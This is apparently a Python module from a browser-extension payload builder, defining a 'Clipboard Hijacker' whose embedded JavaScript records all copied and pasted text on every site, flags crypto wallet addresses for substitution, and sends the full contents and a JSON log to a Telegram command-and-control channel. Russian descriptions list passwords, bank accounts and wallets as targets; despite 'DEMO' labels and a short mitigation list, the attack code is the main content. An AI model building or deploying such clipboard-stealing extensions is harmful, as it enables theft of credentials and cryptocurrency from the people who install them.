from .base import BasePayload, Payload


class ClipboardHijacker(BasePayload):

    def get_payload(self) -> Payload:
        return Payload(
            id="clipboard_hijacker",
            name="Clipboard Hijacker",
            description="Перехватывает буфер обмена. Отправляет в Telegram.",
            icon="📋",
            risk_level="critical",
            permissions=["<all_urls>", "clipboardRead", "clipboardWrite", "storage"],
            targets=[
                "crypto wallet addresses",
                "bank accounts",
                "passwords",
                "URLs",
            ],
            demo_instructions=(
                "1. Установите расширение\n"
                "2. Скопируйте любой текст\n"
                "3. Данные придут в Telegram"
            ),
            mitigation=[
                "Проверяйте адрес кошелька после вставки",
                "Аппаратные кошельки с экраном",
                "Сверяйте первые/последние символы",
                "Используйте QR-коды вместо копирования",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
console.log('[DEMO] Clipboard Hijacker: background loaded');

// Демо-адреса для подмены
const DEMO_REPLACEMENTS = {
    '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa': '1DemoReplacementBTCxxxxxxxxxxxxxxxxx',
    '0x742d35Cc6634C0532925a3b844Bc454e4438f44e': '0xDemoReplacementETHxxxxxxxxxxxxxxxx',
    'TN9RRaXkCFtTXRso2GdTZxSxxwBzNqU8RQ': 'TDemoReplacementUSDTxxxxxxxxxxxxxxx',
    'EQDd4Xj6Xj6Xj6Xj6Xj6Xj6Xj6Xj6Xj6': 'EQDemoReplacementTONxxxxxxxxxxxxxx',
    '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU': 'DemoReplacementSOLxxxxxxxxxxxxxxxxx',
};

let clipboardEvents = [];

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'clipboard_read') {
        const text = msg.text || '';

        // Ищем крипто-адреса
        let matched = null;
        for (const [real, fake] of Object.entries(DEMO_REPLACEMENTS)) {
            if (text.includes(real)) {
                matched = { real, fake };
                break;
            }
        }

        const entry = {
            timestamp: new Date().toISOString(),
            url: msg.url || '',
            text: text,  // ПОЛНЫЙ текст
            length: text.length,
            matched: matched,
        };

        clipboardEvents.push(entry);
        console.log('[DEMO] Clipboard captured:', entry);

        chrome.action.setBadgeText({ text: String(clipboardEvents.length) });
        chrome.action.setBadgeBackgroundColor({ color: '#9C27B0' });

        chrome.storage.local.set({
            demo_clipboard_count: clipboardEvents.length,
            demo_last_clipboard: entry,
        });

        // C2
        if (typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled) {
            let text_msg = `📋 <b>Clipboard Hijacker</b>\n`;
            text_msg += `Сессия: <code>${C2_CONFIG.sessionId}</code>\n`;
            text_msg += `URL: <code>${c2Escape(msg.url || '')}</code>\n`;
            text_msg += `Длина: ${text.length}\n\n`;
            text_msg += `<b>Содержимое:</b>\n<pre>${c2Escape(text.substring(0, 3000))}</pre>`;

            if (matched) {
                text_msg += `\n\n⚠️ <b>Обнаружен крипто-адрес!</b>\n`;
                text_msg += `Оригинал: <code>${c2Escape(matched.real)}</code>\n`;
                text_msg += `Подмена: <code>${c2Escape(matched.fake)}</code>`;
            }

            // JSON-файл
            const jsonData = {
                session_id: C2_CONFIG.sessionId,
                timestamp: new Date().toISOString(),
                total: clipboardEvents.length,
                events: clipboardEvents,
            };
            const filename = `clipboard_${C2_CONFIG.sessionId}_${Date.now()}.json`;
            c2SendDocument(filename, JSON.stringify(jsonData, null, 2));

            c2Send(text_msg);
        }

        sendResponse({ matched });
    }

    if (msg.action === 'get_clipboard_stats') {
        chrome.storage.local.get(
            ['demo_clipboard_count', 'demo_last_clipboard'],
            (data) => sendResponse(data)
        );
        return true;
    }
});
"""

    def get_content_js(self) -> str:
        return r"""
console.log('[DEMO] Clipboard Hijacker: content script loaded');

document.addEventListener('copy', (e) => {
    const selection = window.getSelection();
    const text = selection ? selection.toString() : '';

    if (text) {
        console.log(`[DEMO] Copy: ${text.length} chars`);
        chrome.runtime.sendMessage({
            action: 'clipboard_read',
            text: text,
            url: location.href,
        });
    }
}, true);

document.addEventListener('paste', (e) => {
    const pasted = (e.clipboardData || window.clipboardData).getData('text');
    if (pasted) {
        console.log(`[DEMO] Paste: ${pasted.length} chars`);
        chrome.runtime.sendMessage({
            action: 'clipboard_read',
            text: pasted,
            url: location.href,
            action_type: 'paste',
        });
    }
}, true);
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_clipboard_stats' }, (data) => {
    if (data && data.demo_clipboard_count) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_clipboard_count;
    }
});
"""


__all__ = ["ClipboardHijacker"]
